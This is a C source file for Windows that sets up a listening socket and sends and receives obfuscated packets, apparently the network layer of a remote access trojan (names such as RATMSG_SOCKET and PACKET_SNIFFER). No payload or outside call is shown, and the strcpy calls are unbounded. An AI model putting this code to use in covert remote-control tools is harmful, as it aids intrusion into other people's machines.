#include "Main.h"
#include "Settings.h"
#include "PacketHead.h"
///////////////////////////////////////////////////////////////////////
//socket startup
void InitWSA()
{
	WORD	wVersionRequested;
	WSADATA wsaData;
	int		err;
	wVersionRequested = MAKEWORD( 2, 0 );
    err = WSAStartup( wVersionRequested, &wsaData );
    if ( err != 0 )
		PostQuitMessage(1);

    if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 0 )
	{
	    WSACleanup();
		PostQuitMessage(0);
	}
}
bool InitSocket(HWND hwnd)
{
	hSock = socket(AF_INET,SOCK_STREAM,0);
	WSAAsyncSelect(hSock,hwnd,RATMSG_SOCKET,FD_ACCEPT|FD_CLOSE|FD_READ);
	ServAdr.sin_family=AF_INET;
	ServAdr.sin_addr.s_addr=htonl(INADDR_ANY);
	ServAdr.sin_port=htons(ServerPort);
	bind(hSock,(LPSOCKADDR)&ServAdr,sizeof(struct sockaddr));
	listen(hSock, 1);
	return TRUE;
}
////////////////////////////////////////////////////////////////////////
//Send Data
int FBISend(SOCKET sock,
			char MainData [4096],
			int ID, int ID2, int ID3,
			DWORD PacketType)
{
FBIPACKET FBI;
ZeroMemory(&FBI, sizeof(FBIPACKET));
char buffer[4098]={'\0'};
//Temp = EnDeCrypt(MainData, strlen((const char *)MainData), (const char *)Key);
hideandshow(MainData,buffer);
strcpy(FBI.Data, buffer);
FBI.ID = ID;
FBI.ID2 = ID2;
FBI.ID3 = ID3;
FBI.PacketType = PacketType;

while(send(sock,(char *)&FBI, sizeof(FBIPACKET), 0) == SOCKET_ERROR)
{
Sleep(1000);
}
return 0;
}

///////////////////////////////////////////////////////////////////////
//Recv Data
FBIPACKETA FBIRecv(SOCKET sock)
{
FBIPACKET FBIRecv;
FBIPACKETA FBIRecvB;
char buffer[4096]={'\0'};
char * Temp = NULL;
ZeroMemory(&FBIRecv, sizeof(FBIPACKET));
ZeroMemory(&FBIRecvB, sizeof(FBIPACKETA));
ZeroMemory(buffer, sizeof(buffer));
recv(sock,(char*)&FBIRecv,sizeof(FBIPACKET),0) ;
//Temp = EnDeCrypt(FBIRecv.Data, strlen((const char *)FBIRecv.Data), (const char *)Key);
hideandshow(FBIRecv.Data,buffer);
if(FBIRecv.PacketType == PACKET_SNIFFER)
{
	strcpy(FBIRecvB.Buf, buffer);
}
else
{
FBIRecvB = ParseData(buffer);
}

FBIRecvB.ID  = FBIRecv.ID;
FBIRecvB.ID2 = FBIRecv.ID2;
FBIRecvB.ID3 = FBIRecv.ID3;
FBIRecvB.PacketType = FBIRecv.PacketType;
return FBIRecvB;
}